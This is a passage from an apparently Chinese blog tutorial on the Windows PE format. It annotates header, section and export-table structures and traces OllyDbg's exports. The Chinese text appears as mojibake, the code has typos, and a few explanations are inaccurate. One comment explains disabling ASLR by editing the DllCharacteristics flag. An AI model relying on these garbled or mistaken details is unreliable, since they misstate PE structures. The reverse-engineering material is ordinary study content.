çª—å£åº”ç”¨ç¨‹åº(å¦‚: notepad.exe)</span></span><br><span class="line">    <span class="comment">//value: 3   å«ä¹‰: CUIæ–‡ä»¶     tips: æ§åˆ¶å°åº”ç”¨ç¨‹åº(å¦‚: cmd.exe)</span></span><br><span class="line">    <span class="number">0002</span>   </span><br><span class="line">            </span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    <span class="comment">//DLLçš„æ–‡ä»¶å±æ€§ å¦‚æœæ˜¯DLLæ–‡ä»¶ï¼Œä½•æ—¶è°ƒç”¨DLLæ–‡ä»¶çš„å…¥å£ç‚¹</span></span><br><span class="line">    <span class="comment">//ä¸€èˆ¬çš„exeæ–‡ä»¶æœ‰ä»¥ä¸‹2ä¸ªå±æ€§:</span></span><br><span class="line">    <span class="comment">//IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE(è¡¨ç¤ºæ”¯</span></span><br><span class="line">    <span class="comment">//æŒç»ˆç«¯æœåŠ¡å™¨)8000h  IMAGE_DLLCHARACTERISTICS_NX_COMPAT</span></span><br><span class="line">    <span class="comment">//(è¡¨ç¤ºç¨‹åºé‡‡ç”¨äº†)/NXCOMPATç¼–è¯‘100h  (bit or ä¸º 81000)</span></span><br><span class="line">    <span class="comment">//ä½†æ˜¯å¼€å¯äº†ASLRçš„ç¨‹åºä¼šå¤šä¸€ä¸ª</span></span><br><span class="line">    <span class="comment">//IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE(DLL can move)</span></span><br><span class="line">    <span class="comment">//40hçš„å±æ€§  (bit or åä¸º8140),é‚£å¯ä»¥ä¿®æ”¹è¿™é‡Œå…³é—­ASLR</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">         </span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    <span class="comment">//ä¿ç•™æ ˆçš„å¤§å° é»˜è®¤æ˜¯1MB</span></span><br><span class="line">    <span class="number">00100000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    <span class="comment">//åˆå§‹æ—¶æŒ‡å®šæ ˆå¤§å° é»˜è®¤æ˜¯4KB</span></span><br><span class="line">    <span class="number">00020000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    <span class="comment">//ä¿ç•™å †çš„å¤§å° é»˜è®¤æ˜¯1MB</span></span><br><span class="line">    <span class="number">01000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    <span class="comment">//æŒ‡å®šå †å¤§å° é»˜è®¤æ˜¯4K</span></span><br><span class="line">    <span class="number">00001000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    <span class="comment">//çœ‹åˆ°çš„èµ„æ–™éƒ½æ˜¯ä¿ç•™ value ä¸º 0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    <span class="comment">//æ•°æ®ç›®å½•çš„é¡¹æ•°, å³æŒ‡å‡ºäº†æˆ‘ä»¬ä¸‹é¢ä¸€ä¸ªæˆå‘˜æ•°ç»„çš„ä¸ªæ•°</span></span><br><span class="line">    <span class="comment">//è™½ç„¶å®å®šä¹‰äº†#defineIMAGE_NUMBEROF_DIRECTORY_ENTRIES16</span></span><br><span class="line">    <span class="comment">//ä½†æ˜¯PEè£…è½½å™¨ä¼šé€šè¿‡æ­¤å€¼æ¥è¯†åˆ«æ•°ç»„å¤§å°,è¯´æ˜æ•°ç»„å¤§å°ä¹Ÿå¯èƒ½é16</span></span><br><span class="line">    <span class="number">00000010</span>   </span><br><span class="line">       </span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; </span><br><span class="line">    <span class="comment">//å¾ˆé‡è¦ï¼Œä¸€ä¸ªæ•°æ®ç›®å½•ï¼Œæ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è®°å½•äº†å¯¹äºæ•°æ®é¡¹çš„RVAåŠSize</span></span><br><span class="line">    <span class="comment">//é‡ç‚¹:  EXPORT IMPORT, RESOURCE, TLS Direction</span></span><br><span class="line"> </span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200509154933553-1590826622691.png" alt="image-20200509154933553"></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// è¾“å‡ºè¡¨(å¯¼å…¥è¡¨) (é‡è¦)</span></span></span><br><span class="line">RVA:<span class="number">0010F</span>000 Size:<span class="number">000012F</span>A </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// è¾“å…¥è¡¨ (é‡è¦)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// èµ„æºç›®å½• (é‡è¦)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// å¼‚å¸¸ç›®å½•</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// å®‰å…¨ç›®å½•</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// åŸºå€é‡å®šä½è¡¨ (é‡è¦)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// è°ƒè¯•ç›®å½•</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   <span class="comment">// æè¿°ä¿¡æ¯(ç‰ˆæƒä¿¡æ¯ä¹‹ç±»)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    8   <span class="comment">// æ¶æ„ç‰¹å®šæ•°æ®</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       9   <span class="comment">// æœºå™¨å€¼</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS            10   <span class="comment">// çº¿ç¨‹çº§å±€éƒ¨å­˜å‚¨ç›®å½•(é‡è¦)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    11   <span class="comment">// è½½å…¥é…ç½®ç›®å½•</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   12   <span class="comment">// ç»‘å®šè¾“å…¥ç›®å½• </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            13   <span class="comment">// è¾“å…¥åœ°å€è¡¨</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   14   <span class="comment">// å»¶è¿ŸåŠ è½½å¯¼å…¥æè¿°ç¬¦</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 15   <span class="comment">// COMè¿è¡Œæ—¶æè¿°ç¬¦</span></span></span><br></pre></td></tr></table></figure><blockquote><p>PEæ–‡ä»¶ä¸­çš„code(ä»£ç ), data(æ•°æ®), resource(èµ„æº)ç­‰æŒ‰ç…§å±æ€§åˆ†ç±»å‚¨å­˜åœ¨ä¸åŒçš„èŠ‚åŒº, (1)è¿™æ ·åˆ†ç±»ä¾¿äºç»Ÿä¸€å’ŒæŸ¥çœ‹  (2)è¿™æ ·å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šä¿æŠ¤ç¨‹åºçš„å®‰å…¨æ€§, å› ä¸ºå¦‚æœæŠŠæ‰€æœ‰çš„ä»£ç æ•°æ®æ”¾åœ¨ä¸€èµ·çš„è¯, å½“æˆ‘ä»¬å‘æ•°æ®åŒºå†™æ•°æ®æ—¶, è‹¥è¾“å…¥è¶…è¿‡ç¼“å†²åŒºçš„å¤§å°, é‚£ä¹ˆå°±æœ‰å¯èƒ½ä¼šå°†å…¶ä¸‹çš„code(æŒ‡ä»¤)è¦†ç›–æ‰, é€ æˆåº”ç”¨ç¨‹åºå´©æºƒ. PEæ–‡ä»¶å°±å¯ä»¥æŠŠç›¸ä¼¼å±æ€§çš„çš„æ•°æ®ä¿å­˜åœ¨ä¸€ä¸ªè¢«ç§°ä¸ºâ€èŠ‚åŒºâ€çš„åœ°æ–¹, ç„¶åä¸ºæ¯ä¸ªèŠ‚åŒºè®¾ç½®ä¸åŒçš„ç‰¹æ€§,è®¿é—®æƒé™ç­‰.                                                                              </p></blockquote><h2 id="0x4-èŠ‚åŒºå¤´"><a href="#0x4-èŠ‚åŒºå¤´" class="headerlink" title="0x4 èŠ‚åŒºå¤´"></a>0x4 èŠ‚åŒºå¤´</h2><p><strong>èŠ‚åŒºå¤´æ˜¯ç”±IMAGE_SECTION_HEADERç»“æ„ä½“ç»„æˆçš„æ•°ç»„, æ¯ä¸ªç»“æ„ä½“å¯¹åº”ä¸€ä¸ªèŠ‚åŒº</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME      8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    BYTE NAME[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="comment">//èŠ‚åŒºçš„åå­— 8ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="comment">//å¦‚æœæ‰€æœ‰çš„8å­—èŠ‚éƒ½è¢«ç”¨å…‰ï¼Œè¯¥å­—ç¬¦ä¸²å°±æ²¡æœ‰0ç»“æŸç¬¦ï¼Œ</span></span><br><span class="line">    <span class="comment">//å…¸å‹çš„åç§°.data .text .bss å½¢å¼ (.ä¸æ˜¯å¿…é¡»)</span></span><br><span class="line">    <span class="comment">//èŠ‚åŒºåç§°éƒ½å’ŒèŠ‚ä¸­çš„å†…å®¹ä¸ä¸€å®šç›¸å…³,</span></span><br><span class="line">    <span class="comment">//èŠ‚åç§°æ²¡æœ‰ä¸¥æ ¼è¦æ±‚å‰è¾¹å¸¦æœ‰â€œ$â€çš„ç›¸åŒåå­—çš„åŒºå—åœ¨è½½å…¥æ—¶å€™å°†ä¼šè¢«åˆå¹¶ï¼Œ</span></span><br><span class="line">    <span class="comment">//åœ¨å¹¶ï¼Œåœ¨åˆå¹¶ä¹‹åçš„åŒºå—ä¸­ï¼Œä»–ä»¬æ˜¯ç…§â€œ$â€åè¾¹çš„å­—ç¬¦çš„å­—æ¯é¡ºåºè¿›è¡Œåˆå¹¶çš„ã€‚</span></span><br><span class="line">    <span class="comment">//æ¯ä¸ªåŒºå—çš„åç§°éƒ½æ˜¯å”¯ä¸€çš„ï¼Œä¸èƒ½æœ‰åŒåçš„ä¸¤ä¸ªåŒºå—</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        DOWORD PhysicalAddress; </span><br><span class="line">        DOWORD VitualSize; </span><br><span class="line">    <span class="comment">//å†…å­˜ä¸­èŠ‚åŒºæ‰€å å¤§å°(å®é™…åˆå§‹äº†çš„æ•°æ®å¤§å°, æœªå†…å­˜å¯¹é½)</span></span><br><span class="line">   </span><br><span class="line">    &#125;Misc;</span><br><span class="line">    </span><br><span class="line">    DWORD VirtualAddress; </span><br><span class="line">    <span class="comment">//å†…å­˜ä¸­èŠ‚åŒºçš„èµ·å§‹åœ°å€(RVA). å¼€å§‹æ²¡æœ‰å€¼, ç”±SectionAlignmentç¡®å®š</span></span><br><span class="line">    </span><br><span class="line">    DWORD SizeofRawData; </span><br><span class="line">    <span class="comment">//ç£ç›˜æ–‡ä»¶ä¸­èŠ‚åŒºæ‰€å å¤§å°(å¯¹é½åçš„å¤§å°)</span></span><br><span class="line">    </span><br><span class="line">    DWORD PointerToRawData; </span><br><span class="line">    <span class="comment">//ç£ç›˜æ–‡ä»¶ä¸­èŠ‚åŒºçš„èµ·å§‹ä½ç½®. å¼€å§‹æ²¡æœ‰å€¼, ç”±FileAlignmentç¡®å®š</span></span><br><span class="line">    </span><br><span class="line">    DWORD PointerToRelocations; </span><br><span class="line">    <span class="comment">//é‡å®šä½æŒ‡é’ˆ  ä¸‹é¢å››ä¸ªéƒ½æ˜¯ç”¨äºç›®æ ‡æ–‡ä»¶çš„ä¿¡æ¯</span></span><br><span class="line">        </span><br><span class="line">    DWORD PointerToLinenumbers; </span><br><span class="line">    <span class="comment">//è¡Œæ•°æŒ‡é’ˆ</span></span><br><span class="line">        </span><br><span class="line">    WORD NumberOfRelocations; </span><br><span class="line">    <span class="comment">//é‡å®šä½æ•°</span></span><br><span class="line">    </span><br><span class="line">    WORD NumberOfLinenumbers; </span><br><span class="line">    <span class="comment">//è¡Œæ•°</span></span><br><span class="line">    </span><br><span class="line">    DWORD Characteristics; </span><br><span class="line">    <span class="comment">//æŒ‡å®šèŠ‚çš„å±æ€§,æƒé™. ç”±ä¸åŒçš„å€¼ bit or è€Œæˆ </span></span><br><span class="line">    <span class="comment">//0x20: åŒ…å«ä»£ç .           0x40: åŒ…å«åˆå§‹åŒ–æ•°æ®çš„èŠ‚</span></span><br><span class="line">    <span class="comment">//0x80: åŒ…å«æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚  0x20000000: å¯æ‰§è¡Œ (x)</span></span><br><span class="line">    <span class="comment">//0x40000000: å¯è¯» (r)     0x80000000: å¯å†™ (w)</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>  <strong>ä¸‹å›¾å±•ç¤ºODç¨‹åºçš„å„ä¸ªèŠ‚, å¹¶å°†(.txt)èŠ‚ä¸­çš„å„æˆå‘˜å€¼åœ¨ä¸Šé¢ä¾æ¬¡æ ‡å‡º</strong>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200509170302585-1590826622691.png" alt="image-20200509170302585"></p><blockquote><p>ç”±äºæ¯ä¸ªèŠ‚åŒºéƒ½æœ‰å†…å­˜åœ°å€åˆ°æ–‡ä»¶åç§»é—´çš„æ˜ å°„(RAW-RVA). æˆ‘ä»¬å¯ä»¥é€šè¿‡èŠ‚åŒºçš„VirtualAddressä¸PointerToRawDataæ¥ä»RVA-&gt;RAW. </p><p>æ³¨: ç”±äºVirtualSizeæ˜¯æœªå¯¹é½çš„å¤§å°,è€ŒSizeofRawDataæ˜¯å¯¹é½åçš„å¤§å°, é‚£ä¹ˆ VirtualAddressä¸€èˆ¬æ¯”SizeofRawDataå°.  ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–, å°±æ˜¯å½“å«æœ‰æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚(å¦‚.bss), åœ¨ç£ç›˜ä¸­æœªåˆå§‹åŒ–æ•°æ®æ˜¯ä¸å ç©ºé—´çš„, ä½†æ˜¯åˆ°äº†å†…å­˜, æœªåˆå§‹åŒ–çš„æ•°æ®æ˜¯è¦èµ‹å€¼å ç©ºé—´.</p></blockquote><hr><h2 id="0x5-IMAGE-EXPORT-DIRECTORY-è¾“å‡ºè¡¨"><a href="#0x5-IMAGE-EXPORT-DIRECTORY-è¾“å‡ºè¡¨" class="headerlink" title="0x5 IMAGE_EXPORT_DIRECTORY è¾“å‡ºè¡¨"></a>0x5 IMAGE_EXPORT_DIRECTORY è¾“å‡ºè¡¨</h2><p><strong>ä¸€èˆ¬dllæ–‡ä»¶æ‰æœ‰,DataDirectory[0]è®°å½•äº†RVAåŠSize.</strong></p><p><strong>ç”¨æ¥æè¿°æ¨¡å—ï¼ˆdllï¼‰ä¸­çš„å¯¼å‡ºå‡½æ•°çš„ç»“æ„ï¼Œå¦‚æœä¸€ä¸ªæ¨¡å—å¯¼å‡ºäº†å‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°ä¼šè¢«è®°å½•åœ¨å¯¼å‡ºè¡¨ä¸­,ä»      åº“å‘å…¶ä»–PEæ–‡ä»¶æä¾›æœåŠ¡</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    <span class="comment">//é€šå¸¸ä¸º0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    <span class="comment">//åˆ›å»ºæ—¶é—´, ä¸æ˜¯å¾ˆæœ‰æ•ˆçš„å€¼</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    <span class="comment">//ä¸»ç‰ˆæœ¬å·</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    <span class="comment">//å°ç‰ˆæœ¬å·</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Name;</span><br><span class="line">    <span class="comment">//æŒ‡å‘ä»¥0ç»“å°¾çš„ASCIIå­—ç¬¦ä¸²(DLLåç§°)çš„RVA</span></span><br><span class="line">    <span class="comment">//å¦‚(user32.dll, kernel32.dll)</span></span><br><span class="line">    <span class="number">0010F</span>780</span><br><span class="line">    </span><br><span class="line">    DWORD   Base;</span><br><span class="line">    <span class="comment">//åŸºå€, ä¸€ä¸ªè¾“å‡ºé¡¹çš„åºæ•°å°±æ˜¯å‡½æ•°åœ°å€æ•°ç»„ä¸­çš„ç´¢å¼•å€¼åŠ base.</span></span><br><span class="line">    <span class="comment">//baseå¤§å¤šæ—¶å€™ä¸º1 , è¯´æ˜ç¬¬ä¸€ä¸ªè¾“å‡ºå‡½æ•°çš„åºæ•°ä¸º1</span></span><br><span class="line">    <span class="number">00000001</span></span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    <span class="comment">//å®é™…Exportå‡½æ•°çš„ä¸ªæ•°</span></span><br><span class="line">    <span class="number">000000B</span>C</span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    <span class="comment">//Exportå‡½æ•°ä¸­å…·åçš„å‡½æ•°ä¸ªæ•°(ä»¥åç§°æ¥è¾“å‡ºå‡½æ•°çš„æ•°é‡)</span></span><br><span class="line">    <span class="number">000000B</span>C</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfFunctions;</span><br><span class="line">    <span class="comment">//Exportå‡½æ•°åœ°å€æ•°ç»„(æ•°ç»„ä¸ªæ•°: NumberOfFunctions)</span></span><br><span class="line">    <span class="number">0010F</span>028</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfNames;</span><br><span class="line">    <span class="comment">//Exportå‡½æ•°åç§°åœ°å€æ•°ç»„(æ•°ç»„ä¸ªæ•°:NumberOfNames)</span></span><br><span class="line">    <span class="number">0010F</span>318</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfNameOrdinals;</span><br><span class="line">    <span class="comment">//æŒ‡å‘å‡½æ•°ååç§°å¯¹åº”åºæ•°è¾“å‡ºæ¡ç›®åˆ—è¡¨çš„RVA</span></span><br><span class="line">    <span class="comment">//æ•°ç»„æ¯ä¸ªåç§°æ‹¥æœ‰ä¸€ä¸ªç›¸åº”çš„åºæ•°(æ•°ç»„ä¸ªæ•°:NumberOfNames)</span></span><br><span class="line">    <span class="number">0010F</span>608</span><br><span class="line">    </span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><blockquote><p><strong>ä»å¯¼å‡ºè¡¨ä¸­è·å¾—å‡½æ•°åœ°å€çš„APIä¸º: GetProcAddress()å‡½æ•°. è¯¥APIç”¨æ¥å¼•ç”¨EATæ¥è·å–æŒ‡å®šçš„APIçš„åœ°å€.</strong></p><p><strong>æ³¨: (1) å¯¼å‡ºå‡½æ•°ä¹Ÿå¯èƒ½æ²¡æœ‰åç§°çš„, è¿™æ—¶åªèƒ½é€šè¿‡åºæ•°å¯¼å‡º (2) åºæ•°æ˜¯æŒ‡å®šæŸä¸ªè¾“å‡ºå‡½æ•°çš„ç‹¬ä¸€æ— äºŒçš„16ä½æ•°å­—(2ä¸ªå­—èŠ‚)</strong></p><p>ä¸¤ç§å¯¼å‡ºå‡½æ•°çš„æ–¹æ³•:</p><p><strong>ä¸€:æŒ‰å‡½æ•°åå­—</strong></p><p>â€‹      <strong>(1)é€šè¿‡AddressOfNamesæ‰¾åˆ°å‡½æ•°åç§°æ•°ç»„.  ä½¿ç”¨strcmp()å‡½æ•°, åœ¨(RVA)æŒ‡é’ˆæ•°ç»„ä»ç´¢å¼•å€¼0å¼€å§‹ä¾æ¬¡ä¸æˆ‘ä»¬è¦æ‰¾çš„å‡½æ•°åç§°å¯¹æ¯”,ä»è€Œæ‰¾åˆ°ç´¢å¼•å€¼ index_name</strong></p><p>â€‹      <strong>(2)é€šè¿‡AddressOfNameOrdinalsæ‰¾åˆ°å­˜æ”¾å‡½æ•°åºå·çš„æ•°ç»„, ä½¿ç”¨æ­¥éª¤(1)è·å¾—çš„index_nameä¸ºç´¢å¼•å€¼æ‰¾åˆ°å‡½æ•°åœ°å€çš„åºå·(index_address)</strong></p><p>â€‹      <strong>(3)é€šè¿‡AddressOfFunctionsæ‰¾åˆ°å‡½æ•°åœ°å€æ•°ç»„(EAT), åœ¨EATä¸­ä½¿ç”¨æ­¥éª¤(2)è·å¾—çš„index_addressä¸ºç´¢å¼•å€¼æ‰¾åˆ°æŒ‡å®šå‡½æ•°çš„RVA</strong></p><p><strong>äºŒ:æŒ‰å‡½æ•°åºå·</strong></p><p>â€‹      <strong>(1)ä½¿ç”¨æˆ‘ä»¬å‡½æ•°çš„åºå·å‡å» _IMAGE_EXPORT_DIRECTORY.Base çš„å€¼å¾—åˆ°å‡½æ•°åœ°å€ç´¢å¼•å€¼index_address</strong></p><p>â€‹      <strong>(2)é€šè¿‡AddressOfFunctionsæ‰¾åˆ°å‡½æ•°åœ°å€æ•°ç»„(EAT), åœ¨EATä¸­ä½¿ç”¨æ­¥éª¤(1)è·å¾—çš„index_addressä¸ºç´¢å¼•å€¼æ‰¾åˆ°æŒ‡å®šå‡½æ•°çš„RVA</strong></p></blockquote><p>  <strong>ä¸‹é¢ä¾æ—§ç”¨ODç¨‹åºæ¥çœ‹å¯¼å‡ºè¡¨, å¹¶å°†æ¯ä¸ªå€¼æ ‡åœ¨ä¸Šé¢æ¯ä¸ªæˆå‘˜ä¸‹é¢,  é€šè¿‡ä¸Šé¢IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]ä»‹ç»,  å·²ç»æ ‡å‡ºå¯¼å‡ºè¡¨çš„RVA: 0010F000  Size: 000012FA</strong>. å†é€šè¿‡CFF Explorer å·¥å…·æŸ¥çœ‹æ¯ä¸ªèŠ‚çš„åœ°å€å¯ä»¥è®¡ç®—å‡ºè¾“å‡ºè¡¨çš„ RAW :  <strong>00CE200</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510143001536-1590826622691.png" alt="image-20200510143001536"></p><p>  1.æŸ¥çœ‹è¾“å‡ºè¡¨åç§°(<strong>RVA : 0010F780 -&gt; RAW: 000CE980</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510151725862-1590826622691.png" alt="image-20200510151725862"></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510151945596-1590826622691.png" alt="image-20200510151945596"></p><p>  2.æŸ¥æ‰¾å‡½æ•°åç§°.</p><p>   (1)<strong>AddressOfNames</strong>. (<strong>RVA: 0010F318 -&gt; RAW: 000CE518</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510153257760-1590826622691.png" alt="image-20200510153257760"></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510154247725-1590826622691.png" alt="image-20200510154247725"></p><p>  ç”±(<strong>RVA:0010F78C -&gt; RAW: 000CE98C</strong>):</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510154722496-1590826622691.png" alt="image-20200510154722496"></p><p>  ç°åœ¨å·²ç»æ‰¾åˆ°äº†å‡½æ•°çš„åç§°, ä¸‹é¢æ¨¡æ‹ŸæŸ¥çœ‹ä¸€ä¸ªæŒ‡å®šåç§°å‡½æ•°çš„RVA. å‡è®¾æˆ‘ä»¬æ‰¾çš„æ˜¯<strong>Addsorteddata.</strong>(å³ç¬¬ä¸€ä¸ªå‡½æ•°), (1)é€šè¿‡strcmp(). å¾—åˆ°å®ƒçš„ç´¢å¼•å€¼æ˜¯0, è®°ä¸º index_name.  (2)é€šè¿‡AddressOfNameOrdinalsä½¿ç”¨index_nameæ‰¾åˆ°å‡½æ•°çš„åºæ•°, é€šè¿‡ä¸‹å›¾å¾—åˆ°åºæ•°0, è®°ä¸ºindex_address.</p><p>  <strong>AddressOfNameOrdinals</strong>.  (<strong>RVA: 0010F608 -&gt; RAW: 000CE808</strong>):<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510160635396-1590826622691.png" alt="image-20200510160635396"></p><p>  (3)é€šè¿‡AddressOfFunctionså‡½æ•°åœ°å€æ•°ç»„(EAT), ä½¿ç”¨index_addressä¸ºç´¢å¼•å€¼å¾—åˆ°æˆ‘ä»¬æŒ‡å®šå‡½æ•°çš„RVA.</p><p>   AddressOfFunctions(<strong>RVA: 0010F028 -&gt; RAW: 000CE228</strong>):<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510161225077-1590826622691.png" alt="image-20200510161225077"></p><p>  åˆ°æ­¤, å¾—åˆ°æˆ‘ä»¬æŒ‡å®šè¾“å‡ºå‡½æ•°<strong>Addsorteddata.</strong>çš„RVA: 